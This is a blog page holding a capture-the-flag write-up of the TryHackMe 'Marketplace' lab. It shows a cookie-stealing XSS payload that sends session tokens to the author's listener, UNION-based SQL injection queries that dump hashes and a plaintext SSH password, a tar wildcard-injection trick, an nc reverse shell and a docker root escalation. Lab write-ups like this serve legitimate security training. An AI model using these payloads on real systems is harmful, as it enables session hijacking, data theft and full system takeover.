<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="Enumeration nmap 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLj5F//uf40JILlSfWp95GsOiuwSGSKLgbFmUQOACKAdzVcGOteVr3lFn7vBsp6xWM5iss8APYi9WqKpPQxQLr2jNBybW6qrNfpUMVH2lLcUHkiHkFBpEoTP9m/6P9bUDCe39aEhllZOCUgEtmLpdKl7OA3tVjhthrNHNPW&#43;LVfkwlBgxGqnRWxlY6XtlsYEKfS1B&#43;wODrcVwUxOHthDps/JMDUvkQUfgf/jpy99&#43;twbOI1OZbCYGJFtV6dZoRqsp1Y4BpM3VjSrrvV0IzYThRdssrSUgOnYrVOZl8MrjMFAxOaFbTF2bYGAS/T68/JxVxktbpGN/1iOrq3LRhxbF1| 256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyTgq5FoUG3grC5KNPAuPWDfDbnaq1XPRc8j5/VkmZVpcGuZaAjJibb9RVHDlbiAfVxO2KYoOUHrpIRzKhjHEE=| 256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2ol/CJc6HIWgvu6KQ7lZ6WWgNsTk29bPKgkhCvG2Ar80/tcp open http syn-ack nginx 1.19.2|_http-server-header: nginx/1.19.2| http-robots.txt: 1 disallowed entry |_/admin|_http-title: The Marketplace| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS32768/tcp open http syn-ack Node.js (Express middleware)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-robots." />
<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/tryhackme/the-marketplace/the-marketplace/" />


    <title>
        
            The Marketplace :: Zer0ne blog 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="The Marketplace">
<meta itemprop="description" content="Enumeration nmap 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLj5F//uf40JILlSfWp95GsOiuwSGSKLgbFmUQOACKAdzVcGOteVr3lFn7vBsp6xWM5iss8APYi9WqKpPQxQLr2jNBybW6qrNfpUMVH2lLcUHkiHkFBpEoTP9m/6P9bUDCe39aEhllZOCUgEtmLpdKl7OA3tVjhthrNHNPW&#43;LVfkwlBgxGqnRWxlY6XtlsYEKfS1B&#43;wODrcVwUxOHthDps/JMDUvkQUfgf/jpy99&#43;twbOI1OZbCYGJFtV6dZoRqsp1Y4BpM3VjSrrvV0IzYThRdssrSUgOnYrVOZl8MrjMFAxOaFbTF2bYGAS/T68/JxVxktbpGN/1iOrq3LRhxbF1| 256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyTgq5FoUG3grC5KNPAuPWDfDbnaq1XPRc8j5/VkmZVpcGuZaAjJibb9RVHDlbiAfVxO2KYoOUHrpIRzKhjHEE=| 256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2ol/CJc6HIWgvu6KQ7lZ6WWgNsTk29bPKgkhCvG2Ar80/tcp open http syn-ack nginx 1.19.2|_http-server-header: nginx/1.19.2| http-robots.txt: 1 disallowed entry |_/admin|_http-title: The Marketplace| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS32768/tcp open http syn-ack Node.js (Express middleware)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-robots."><meta itemprop="datePublished" content="2022-09-20T16:00:31+01:00" />
<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
<meta itemprop="wordCount" content="1361"><meta itemprop="image" content="http://localhost:1313/" />
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="The Marketplace"/>
<meta name="twitter:description" content="Enumeration nmap 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLj5F//uf40JILlSfWp95GsOiuwSGSKLgbFmUQOACKAdzVcGOteVr3lFn7vBsp6xWM5iss8APYi9WqKpPQxQLr2jNBybW6qrNfpUMVH2lLcUHkiHkFBpEoTP9m/6P9bUDCe39aEhllZOCUgEtmLpdKl7OA3tVjhthrNHNPW&#43;LVfkwlBgxGqnRWxlY6XtlsYEKfS1B&#43;wODrcVwUxOHthDps/JMDUvkQUfgf/jpy99&#43;twbOI1OZbCYGJFtV6dZoRqsp1Y4BpM3VjSrrvV0IzYThRdssrSUgOnYrVOZl8MrjMFAxOaFbTF2bYGAS/T68/JxVxktbpGN/1iOrq3LRhxbF1| 256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyTgq5FoUG3grC5KNPAuPWDfDbnaq1XPRc8j5/VkmZVpcGuZaAjJibb9RVHDlbiAfVxO2KYoOUHrpIRzKhjHEE=| 256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2ol/CJc6HIWgvu6KQ7lZ6WWgNsTk29bPKgkhCvG2Ar80/tcp open http syn-ack nginx 1.19.2|_http-server-header: nginx/1.19.2| http-robots.txt: 1 disallowed entry |_/admin|_http-title: The Marketplace| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS32768/tcp open http syn-ack Node.js (Express middleware)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-robots."/>



    <meta property="og:title" content="The Marketplace" />
<meta property="og:description" content="Enumeration nmap 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLj5F//uf40JILlSfWp95GsOiuwSGSKLgbFmUQOACKAdzVcGOteVr3lFn7vBsp6xWM5iss8APYi9WqKpPQxQLr2jNBybW6qrNfpUMVH2lLcUHkiHkFBpEoTP9m/6P9bUDCe39aEhllZOCUgEtmLpdKl7OA3tVjhthrNHNPW&#43;LVfkwlBgxGqnRWxlY6XtlsYEKfS1B&#43;wODrcVwUxOHthDps/JMDUvkQUfgf/jpy99&#43;twbOI1OZbCYGJFtV6dZoRqsp1Y4BpM3VjSrrvV0IzYThRdssrSUgOnYrVOZl8MrjMFAxOaFbTF2bYGAS/T68/JxVxktbpGN/1iOrq3LRhxbF1| 256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyTgq5FoUG3grC5KNPAuPWDfDbnaq1XPRc8j5/VkmZVpcGuZaAjJibb9RVHDlbiAfVxO2KYoOUHrpIRzKhjHEE=| 256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2ol/CJc6HIWgvu6KQ7lZ6WWgNsTk29bPKgkhCvG2Ar80/tcp open http syn-ack nginx 1.19.2|_http-server-header: nginx/1.19.2| http-robots.txt: 1 disallowed entry |_/admin|_http-title: The Marketplace| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS32768/tcp open http syn-ack Node.js (Express middleware)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-robots." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/tryhackme/the-marketplace/the-marketplace/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-09-20T16:00:31+01:00" />
<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />





    <meta property="article:section" content="TryHackMe" />



    <meta property="article:published_time" content="2022-09-20 16:00:31 &#43;0100 WAT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="http://localhost:1313/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">#&gt;</span>
            <span class="logo__text">0/1</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/writeups/tryhackme/the-marketplace/the-marketplace/">The Marketplace</a></h2>

            
            
            

            <div class="post-content">
                <!-- raw HTML omitted -->
<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">nmap</h3>
<pre tabindex="0"><code>22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLj5F//uf40JILlSfWp95GsOiuwSGSKLgbFmUQOACKAdzVcGOteVr3lFn7vBsp6xWM5iss8APYi9WqKpPQxQLr2jNBybW6qrNfpUMVH2lLcUHkiHkFBpEoTP9m/6P9bUDCe39aEhllZOCUgEtmLpdKl7OA3tVjhthrNHNPW+LVfkwlBgxGqnRWxlY6XtlsYEKfS1B+wODrcVwUxOHthDps/JMDUvkQUfgf/jpy99+twbOI1OZbCYGJFtV6dZoRqsp1Y4BpM3VjSrrvV0IzYThRdssrSUgOnYrVOZl8MrjMFAxOaFbTF2bYGAS/T68/JxVxktbpGN/1iOrq3LRhxbF1
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyTgq5FoUG3grC5KNPAuPWDfDbnaq1XPRc8j5/VkmZVpcGuZaAjJibb9RVHDlbiAfVxO2KYoOUHrpIRzKhjHEE=
|   256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2ol/CJc6HIWgvu6KQ7lZ6WWgNsTk29bPKgkhCvG2Ar

80/tcp    open  http    syn-ack nginx 1.19.2
|_http-server-header: nginx/1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

32768/tcp open  http    syn-ack Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><h3 id="ffuf">ffuf</h3>
<pre tabindex="0"><code>.hta                    [Status: 403, Size: 153, Words: 3, Lines: 8]
.htaccess               [Status: 403, Size: 153, Words: 3, Lines: 8]
.htpasswd               [Status: 403, Size: 153, Words: 3, Lines: 8]
                        [Status: 200, Size: 779, Words: 176, Lines: 36]
admin                   [Status: 403, Size: 392, Words: 75, Lines: 22]
Admin                   [Status: 403, Size: 392, Words: 75, Lines: 22]
ADMIN                   [Status: 403, Size: 392, Words: 75, Lines: 22]
images                  [Status: 301, Size: 179, Words: 7, Lines: 11]
login                   [Status: 200, Size: 857, Words: 200, Lines: 36]
Login                   [Status: 200, Size: 857, Words: 200, Lines: 36]
messages                [Status: 302, Size: 28, Words: 4, Lines: 1]
new                     [Status: 302, Size: 28, Words: 4, Lines: 1]
robots.txt              [Status: 200, Size: 31, Words: 3, Lines: 3]
signup                  [Status: 200, Size: 667, Words: 159, Lines: 31]
stylesheets             [Status: 301, Size: 189, Words: 7, Lines: 11]
</code></pre><p>we visit the website (port 80 and 32768 look identical)</p>
<p>meet <code>jake</code> and <code>michael</code></p>
<p>signup, then login</p>
<p>we are not authorized to visit <code>/admin</code> dir&hellip;yet</p>
<p>when trying to create a new listing I tried to enable the upload button from code inspector but no use</p>
<p>the hint said to look around the report option&hellip;when you report a listing to admins you get a message back</p>
<p>I tried to check for xss and yup&hellip;</p>
<p>when creating a ne listing the most basic checks works with</p>
<p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>But what do we do with this?</p>
<p>oh&hellip;cookies! took me some time!</p>
<p>there is a <code>token</code> cookie that register your session&hellip;decoding it with jwt.io is not really helpful</p>
<p>But combined with the XSS vulnerability we can do some <code>Cookie stealing</code> and get admin&rsquo;s</p>
<p>Basically we forge a cookie-stealing Reflected Xss payload like&hellip;</p>
<p><code>&lt;script&gt;new Image().src=&quot;http://10.8.226.203:8080/?&quot;+document.cookie;&lt;/script&gt;</code></p>
<p>It obviously sends the user&rsquo;s cookie to our machine server on specified port (8080 for me)</p>
<p>then start a listener on said port</p>
<p>We use it when creating our new listing&hellip;</p>
<p>And get our own cookie</p>
<pre tabindex="0"><code>└──╼ $nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 33142
GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiZmxvIiwiYWRtaW4iOmZhbHNlLCJpYXQiOjE2NDI4NTIwMTd9.jIodXdkw16d4Hlb3cecsHd3KqHuRuTqvVv7EsWnObzc HTTP/1.1
Host: 10.8.226.203:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Referer: http://10.10.228.67/item/3
Sec-GPC: 1
</code></pre><p>Now report that listing to admins!</p>
<p>its obviously a malicious listing&hellip;stealng people&rsquo;s cookies</p>
<p>(make sure to keep the listener alive)</p>
<p>We wait a bit and get admin&rsquo;s cookie</p>
<p>Note that I think it was unrealistically fast for a Reflected Xss (you usually wait for people to click on your malicious link wich may takes long)</p>
<p>This is probably running automatically with a cron-like job</p>
<pre tabindex="0"><code>└──╼ $nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 39020
GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NDI4NTIyNDV9.r1mGSf6yZVq33YPYEC3_xGPVkYxTPitiPr6ctYjKAn0 HTTP/1.1
Host: 10.8.226.203:8080
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://localhost:3000/item/3
Accept-Encoding: gzip, deflate
Accept-Language: en-US
</code></pre><p>Now replace your poor-people&rsquo;s cookie with extra-privileges flavored admin&rsquo;s cookie</p>
<p>You can just use the inspector/storage to change token&rsquo;s value</p>
<p>First flag is Right on administration panel</p>
<p><code>THM{what_are_you_buying}</code></p>
<p>You can also see there are 2 admins, <code>jake</code> and <code>michael</code></p>
<p>I clicked on michael and noticed the url was like</p>
<p><code>http://10.10.228.67/admin?user=2</code></p>
<p>And I made it go like</p>
<p><code>http://10.10.228.67/admin?user=2'</code></p>
<p>Then It start acting</p>
<pre tabindex="0"><code>Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39; at line 1
</code></pre><p>And I was like &ldquo;chill bro its a simple colon&rdquo; And went</p>
<p><code>http://10.10.228.67/admin?user=0 union select 1,2,3,4</code></p>
<p>It then calmed down and gave me <code>user 1</code> So I said</p>
<p><code>http://10.10.228.67/admin?user=0 union select version(),2,3,4</code></p>
<p>It replied <code>User 8.0.21</code>&hellip;</p>
<p>At this point you can get anything from that UNION-Based SQLi</p>
<p>database</p>
<p><code>http://10.10.228.67/admin?user=0 union select database(),2,3,4</code></p>
<p>tables</p>
<p><code>0 union select group_concat(table_name),database(),3,4 from information_schema.tables where table_schema='marketplace'</code></p>
<p>columns</p>
<p><code>10.10.228.67/admin?user=0 union select group_concat(column_name),database(),3,4 from information_schema.columns where table_name='users'</code></p>
<p>So for the basic informations</p>
<pre tabindex="0"><code>database = marketplace
version = 8.0.21
tables = users , items, messages
columns = id,isAdministrator,password,username
</code></pre><p>Now we all would go straiht to <code>password</code> column</p>
<pre tabindex="0"><code>$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW,

$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q,

$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG,

$2b$10$daomPlspz0EKa7wbtEQfeu1DGUWIiLxejvz/i2s3dMkE4SAxoq.Da
</code></pre><p>(remove the concat colon separator though)</p>
<p>If you didnt recognize it (with that ugly $2b$) its <code>BCRYPT</code></p>
<p>your time-wasting nightmare! crackin those would take years for me</p>
<p>if the hash was even actually in rockyou.txt</p>
<p>So I went for help and you can actually dig deeper in the database</p>
<p>For the columns you go</p>
<p><code>10.10.228.67/admin?user=0 union select group_concat(column_name),database(),3,4 from information_schema.columns where table_name='messages'</code></p>
<p>and get <code>id,is_read,message_content,user_from,user_to</code></p>
<p>So you concat that with <code>10.10.228.67/admin?user=0 union select group_concat(id,message_content),database(),3,4 from messages</code></p>
<p>And bingo!</p>
<pre tabindex="0"><code>User 1Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ,2Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,3Thank you for your report. We have been unable to review the listing at this time. Something may be blocking our ability to view it, such as alert boxes, which are blocked in our employee&#39;s browsers.,4Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,5Thank you for your report. We have reviewed the listing and found nothing that violates our rules.,6Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via pr
</code></pre><p>There are passwords in messages? who would know???</p>
<p>anyway we got ssh access now:</p>
<p><code>jake:@b_ENXkGYUCAv3zJ</code></p>
<p>Get the use flag</p>
<pre tabindex="0"><code>jake@the-marketplace:~$ cat user.txt
THM{a_user_flag_for_one_dollar}
</code></pre><h2 id="privilege-escalation">privilege escalation</h2>
<p>The classics first</p>
<pre tabindex="0"><code>jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
    
</code></pre><p>uh? we run backups as michael? what is michael backing up?</p>
<pre tabindex="0"><code>jake@the-marketplace:~$ id michael
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
</code></pre><p>That bad boi michael is in docker group</p>
<pre tabindex="0"><code>jake@the-marketplace:~$ cd /opt/backups
jake@the-marketplace:/opt/backups$ cat backup.sh
#!/bin/bash
echo &#34;Backing up files...&#34;;
tar cf /opt/backups/backup.tar *
</code></pre><p>I just googled that last line with &ldquo;privilege escalation&rdquo;</p>
<p>Its called <a href="https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/">wildcard injection</a> as it seems</p>
<p>Tried the artcle&rsquo;s demo method</p>
<pre tabindex="0"><code>jake@the-marketplace:/opt/backups$ echo &#39;echo &#34;jake ALL=(root) NOPASSWD: ALL&#34; &gt;&gt; /etc/sudoers&#39; &gt; demo.sh
jake@the-marketplace:/opt/backups$ touch -- --checkpoint=1
jake@the-marketplace:/opt/backups$ touch -- &#34;--checkpoint-action=exec=sh demo.sh&#34;
jake@the-marketplace:/opt/backups$ chmod 777 backup.tar demo.sh
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh
Backing up files...
tar: backup.tar: file is the archive; not dumped
demo.sh: 1: demo.sh: cannot create /etc/sudoers: Permission denied
</code></pre><p>But we can&rsquo;t add jake to sudoers (michael cannot do that)</p>
<p>I found another method&hellip;as demo.sh is executed, we can just make it a reverse shell</p>
<pre tabindex="0"><code>jake@the-marketplace:/opt/backups$ echo &#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.226.203 2311 &gt;/tmp/f&#34; &gt; shell.sh
jake@the-marketplace:/opt/backups$ touch -- --checkpoint=1
jake@the-marketplace:/opt/backups$ touch -- &#34;--checkpoint-action=exec=sh shell.sh&#34;
jake@the-marketplace:/opt/backups$ chmod 777 shell.sh
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh
Backing up files...
tar: backup.tar: file is the archive; not dumped
demo.sh: 1: demo.sh: cannot create /etc/sudoers: Permission denied
rm: cannot remove &#39;/tmp/f&#39;: No such file or directory
</code></pre><pre tabindex="0"><code>└──╼ $nc -lnvp 2311
listening on [any] 2311 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 60464
$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
</code></pre><p>We are michael now&hellip;we have docker power</p>
<p>Docker is a root servce so we can mount it on our machine for root shell</p>
<p>you can visit Gtfobins for this one</p>
<p>First get comfortable</p>
<pre tabindex="0"><code>$ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
michael@the-marketplace:/opt/backups$
</code></pre><p>second get root</p>
<pre tabindex="0"><code>michael@the-marketplace:/opt/backups$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
t /mnt shn -v /:/mnt --rm -it alpine chroot
# uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
</code></pre><p>then get paid!</p>
<pre tabindex="0"><code># cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
THM{a_root_flag_for_about_three_fiddies}
</code></pre><p>Nice customer service</p>
<p>Would recommand this marketplace 100% !</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/categories/tryhackme/">TryHackMe</a></span>
        
    </p>

			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>



    </body>
</html>
